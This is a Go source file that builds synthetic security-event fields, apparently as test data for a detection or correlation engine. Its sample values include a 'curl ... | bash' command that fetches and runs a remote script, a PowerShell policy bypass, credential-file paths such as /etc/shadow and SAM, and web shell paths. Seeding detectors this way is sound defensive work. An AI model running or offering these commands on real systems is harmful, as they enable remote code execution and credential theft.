package seeder

import (
	"fmt"
	"math/rand"
	"strings"

	"github.com/brianvoe/gofakeit/v6"
)

// fieldGenerator handles generation of field values
type fieldGenerator struct {
	params map[string]interface{} // Override parameters from YAML config
}

// newFieldGenerator creates a new field generator
func newFieldGenerator(params map[string]interface{}) *fieldGenerator {
	return &fieldGenerator{
		params: params,
	}
}

// generateGroupByValues creates consistent values for group_by fields
func (fg *fieldGenerator) generateGroupByValues(groupByFields []string) map[string]interface{} {
	values := make(map[string]interface{})

	for _, field := range groupByFields {
		// Check if override exists in params
		paramKey := field[1:] // Remove leading dot
		if val, exists := fg.params[paramKey]; exists {
			values[field] = val
			continue
		}

		// Generate appropriate value based on field name
		values[field] = fg.generateValueForField(field)
	}

	return values
}

// generateValueForField generates an appropriate value for a given field
func (fg *fieldGenerator) generateValueForField(field string) interface{} {
	// Check for specific field patterns in order of specificity
	fieldLower := ""
	for _, c := range field {
		if c >= 'A' && c <= 'Z' {
			fieldLower += string(c + 32)
		} else {
			fieldLower += string(c)
		}
	}

	// IP addresses
	if containsIgnoreCase(field, ".ip") || containsIgnoreCase(field, "_ip") {
		return gofakeit.IPv4Address()
	}
	// User names
	if containsIgnoreCase(field, "user.name") || containsIgnoreCase(field, "username") {
		return gofakeit.Username()
	}
	// User IDs (UID)
	if containsIgnoreCase(field, "user.uid") || containsIgnoreCase(field, ".uid") {
		return gofakeit.UUID()
	}
	// Ports
	if containsIgnoreCase(field, ".port") || containsIgnoreCase(field, "_port") {
		// Return as integer for OpenSearch compatibility (correlation engine expects numeric type)
		return rand.Intn(65535-1024) + 1024
	}
	// Hostnames
	if containsIgnoreCase(field, "hostname") || containsIgnoreCase(field, ".host") {
		return gofakeit.DomainName()
	}
	// Email
	if containsIgnoreCase(field, "email") {
		return gofakeit.Email()
	}
	// Process names
	if containsIgnoreCase(field, "process.name") {
		processes := []string{
			"sshd", "bash", "python3", "node", "nginx", "apache2",
			"powershell.exe", "cmd.exe", "explorer.exe", "svchost.exe",
			"java", "docker", "systemd", "cron",
		}
		return processes[rand.Intn(len(processes))]
	}
	// Process IDs
	if containsIgnoreCase(field, "process.pid") || containsIgnoreCase(field, ".pid") {
		return rand.Intn(65535) + 1
	}
	// Process command line
	if containsIgnoreCase(field, "process.cmd_line") || containsIgnoreCase(field, "cmdline") {
		cmdLines := []string{
			"/usr/bin/python3 -m http.server 8000",
			"/bin/bash -c 'curl http://example.com/script.sh | bash'",
			"powershell.exe -ExecutionPolicy Bypass -File script.ps1",
			"cmd.exe /c whoami",
			"/usr/sbin/sshd -D",
			"docker run -d nginx:latest",
		}
		return cmdLines[rand.Intn(len(cmdLines))]
	}
	// File paths
	if containsIgnoreCase(field, "file.path") || containsIgnoreCase(field, ".path") {
		paths := []string{
			"/etc/passwd", "/etc/shadow", "/var/log/auth.log",
			"/home/user/.ssh/id_rsa", "/tmp/malware.sh",
			"C:\\Windows\\System32\\config\\SAM",
			"C:\\Users\\admin\\Documents\\passwords.txt",
			"/usr/bin/wget", "/bin/bash",
		}
		return paths[rand.Intn(len(paths))]
	}
	// File names
	if containsIgnoreCase(field, "file.name") {
		files := []string{
			"malware.exe", "script.sh", "config.yaml",
			"credentials.txt", "id_rsa", "authorized_keys",
			"shadow", "passwd", "SAM",
		}
		return files[rand.Intn(len(files))]
	}
	// File sizes
	if containsIgnoreCase(field, "file.size") {
		// Return realistic file sizes (bytes)
		return rand.Intn(10*1024*1024) + 1024 // 1KB to 10MB
	}
	// Device/MAC addresses
	if containsIgnoreCase(field, ".mac") || containsIgnoreCase(field, "mac_address") {
		return gofakeit.MacAddress()
	}
	// Domain names
	if containsIgnoreCase(field, ".domain") || containsIgnoreCase(field, "user.domain") {
		domains := []string{"CORP", "WORKGROUP", "example.com", "internal.local"}
		return domains[rand.Intn(len(domains))]
	}
	// DNS query hostname
	if containsIgnoreCase(field, "query.hostname") {
		domains := []string{
			"example.com", "api.github.com", "malicious-site.ru",
			"cdn.cloudflare.net", "login.microsoft.com", "updates.ubuntu.com",
			"suspicious-long-subdomain-name-12345.attacker.com",
		}
		return domains[rand.Intn(len(domains))]
	}
	// HTTP URL path
	if containsIgnoreCase(field, "url.path") || containsIgnoreCase(field, "http_request.url.path") {
		paths := []string{
			"/api/v1/users", "/api/v1/auth/login", "/api/v1/events",
			"/admin/dashboard", "/admin/config.php", "/shell.php",
			"/uploads/backdoor.aspx", "/api/data/export",
		}
		return paths[rand.Intn(len(paths))]
	}
	// HTTP URL hostname
	if containsIgnoreCase(field, "url.hostname") || containsIgnoreCase(field, "http_request.url.hostname") {
		return gofakeit.DomainName()
	}
	// HTTP User Agent
	if containsIgnoreCase(field, "user_agent") || containsIgnoreCase(field, "http_request.user_agent") {
		agents := []string{
			gofakeit.UserAgent(),
			"sqlmap/1.0", "Nmap Scripting Engine", "nikto/2.1.6",
			"python-requests/2.28.0", "curl/7.68.0",
		}
		return agents[rand.Intn(len(agents))]
	}
	// Session UID
	if containsIgnoreCase(field, "session.uid") {
		return fmt.Sprintf("sess-%s", gofakeit.UUID()[:8])
	}

	// Default: random string
	return gofakeit.Word()
}

// generateUniqueValueForField generates a unique value for a field (for value_count)
func (fg *fieldGenerator) generateUniqueValueForField(field string, index int) interface{} {
	// Common field patterns
	if containsIgnoreCase(field, "port") {
		// Generate sequential ports starting from 1024
		// Return as integer for OpenSearch compatibility (correlation engine expects numeric type)
		return 1024 + index
	}
	if containsIgnoreCase(field, "ip") || containsIgnoreCase(field, "addr") {
		// Generate IPs in a range
		return fmt.Sprintf("10.0.%d.%d", index/256, index%256)
	}
	if containsIgnoreCase(field, "user.name") || containsIgnoreCase(field, "username") {
		return fmt.Sprintf("user%d", index)
	}
	if containsIgnoreCase(field, "hostname") || containsIgnoreCase(field, "host") {
		return fmt.Sprintf("host-%d.example.com", index)
	}

	// Default: indexed value
	return fmt.Sprintf("value-%d", index)
}

// setFieldValue sets a nested field value using dot notation
func setFieldValue(event map[string]interface{}, fieldPath string, value interface{}) {
	// Remove leading dot if present
	fieldPath = fieldPath[1:] // Remove leading dot

	parts := splitFieldPath(fieldPath)
	current := event

	for i, part := range parts {
		if i == len(parts)-1 {
			// Last part - set the value
			current[part] = value
		} else {
			// Intermediate part - ensure nested map exists
			if _, exists := current[part]; !exists {
				current[part] = make(map[string]interface{})
			}
			current = current[part].(map[string]interface{})
		}
	}
}

// splitFieldPath splits a field path like ".actor.user.name" into parts
func splitFieldPath(path string) []string {
	// Remove leading dot
	if len(path) > 0 && path[0] == '.' {
		path = path[1:]
	}

	// Use strings.Split for simplicity and correctness
	return strings.Split(path, ".")
}

// containsIgnoreCase checks if a string contains a substring (case-insensitive)
func containsIgnoreCase(s, substr string) bool {
	return strings.Contains(strings.ToLower(s), strings.ToLower(substr))
}
